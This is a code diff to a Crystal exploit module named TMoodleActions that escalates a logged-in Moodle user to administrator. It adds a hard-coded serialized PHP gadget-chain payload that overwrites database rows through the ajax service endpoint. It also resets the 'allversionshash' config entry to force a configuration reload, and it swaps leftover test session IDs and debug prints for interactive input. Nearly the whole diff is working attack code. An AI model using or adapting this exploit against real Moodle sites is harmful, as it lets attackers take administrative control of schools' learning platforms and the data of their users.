@@ -19,11 +19,11 @@ module TMoodleActions
     # Or paste it into the Dev Tools console.
     def perform(url)
       puts "[?] Enter your MoodleSession. Use helper command if needed."
-      moodle_session = "4cee42a0c279474d278c5d708c3f1498" # gets().not_nil!
-      # puts "[?] Enter session key"
-      sess_key = "CS9edmUxOp" # gets().not_nil!
+      moodle_session = gets().not_nil!
+      puts "[?] Enter session key"
+      sess_key = gets().not_nil!
       puts "[?] Enter your user id"
-      user_id = 3 # gets().not_nil!.to_i
+      user_id = gets().not_nil!.to_i
       puts "[>] Executing attack..."
       execute(url, moodle_session, sess_key, value: user_id)
       puts "[*] You should now be an administrator."
@@ -38,7 +38,7 @@ module TMoodleActions
       puts "[>] Setting configuration payload..."
       update_table(url, moodle_session, sess_key, table, row_id, column, value)
 
-      row_id = 375 # row id of "allversionshash" parameter
+      row_id = 374 # row id of "allversionshash" parameter
       # reset the allversionshash config entry with a sha1 hash so the site reloads its configuration
       sha_hash = Digest::SHA1.hexdigest(Time.utc_now.to_unix.to_s)
       puts "[>] Resetting config hash to trigger configuration reload..."
@@ -64,8 +64,6 @@ module TMoodleActions
       if json
         return HTTP::Client.post(url, headers: headers, body: data)
       else
-        puts "Big oops!"
-        puts data.to_s
         return HTTP::Client.post(url, headers: headers, body: data)
       end
     end
@@ -78,8 +76,6 @@ module TMoodleActions
       end
 
       if json
-        puts "Big oops"
-        puts data.to_s
         return HTTP::Client.post(url, headers: headers, body: HTTP::Params.encode(data))
       else
         return HTTP::Client.post(url, headers: headers, form: data)
@@ -99,20 +95,17 @@ module TMoodleActions
       # below is a serialized PHP object
       table_name_length = table.bytesize
       column_name_length = column.bytesize
-      # value = "a:2:{i:0;a:1:{" \
-      #         "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
-      #         "i:1;O:40:\"gradereport_singleview\\local\\u\\feedback\":1:{" \
-      #         "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
-      #         "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
-      #         "s:11:\"calculation\";" \
-      #         "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
-      #         "s:5:\"table\";s:#{table_name_length}:\"#{table}\";" \
-      #         "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column}\";" \
-      #         "i:#{value};s:8:\"d_fields\";a:2:{" \
-      #         "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}};"
-      puts "Insert payload " + row_id.to_s
-      value = gets()
-      # puts value
+      value = "a:2:{i:0;a:1:{" \
+              "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
+              "i:1;O:40:\"gradereport_singleview\\local\\u\\feedback\":1:{" \
+              "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
+              "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
+              "s:11:\"calculation\";" \
+              "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
+              "s:5:\"table\";s:#{table_name_length}:\"#{table}\";" \
+              "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column}\";" \
+              "i:#{value};s:8:\"d_fields\";a:2:{" \
+              "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}};"
       #   we"ll set the course_blocks sortorder to 0 so we default to legacy user preference
       data = {"sesskey" => sess_key, "sortorder[]" => "0"}
       puts data
@@ -142,8 +135,7 @@ module TMoodleActions
           end
         end
       end
-      # [>] Authenticated session ID => 4cee42a0c279474d278c5d708c3f1498
-      # [>] Authenticated session key => CS9edmUxOp
+
       #     httpPost($url..$sesskey, $data, $MoodleSession,1);
       puts "[>] Injecting payload..."
       puts http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", string.to_s, moodle_session, true).body
